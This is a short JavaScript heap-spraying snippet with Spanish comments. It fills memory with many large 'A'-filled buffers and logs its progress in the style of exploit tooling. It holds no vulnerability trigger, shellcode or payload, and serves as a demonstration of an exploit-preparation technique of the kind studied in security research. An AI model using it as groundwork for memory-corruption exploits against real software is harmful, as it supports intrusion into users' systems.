(function() {
    const sprayArray = [];
    const sprayCount = 1000; // Aumentar el número de objetos
    const spraySize = 0x10000; // Tamaño más grande para cada objeto

    // Clases de objetos variados
    class ComplexObject {
        constructor(id) {
            this.id = id;
            this.data = new Uint8Array(spraySize).fill(0x41); // Llenar con 'A's
            this.nestedObject = {
                nestedData: new Array(128).fill(Math.random()), // Datos aleatorios
            };
        }
    }

    console.log("[*] Comenzando heap spraying...");

    for (let i = 0; i < sprayCount; i++) {
        sprayArray.push(new ComplexObject(i)); // Crear objetos complejos
    }

    console.log("[*] Heap spraying completado.");
    console.log(`[*] Total de objetos en el heap: ${sprayArray.length}`);
})();
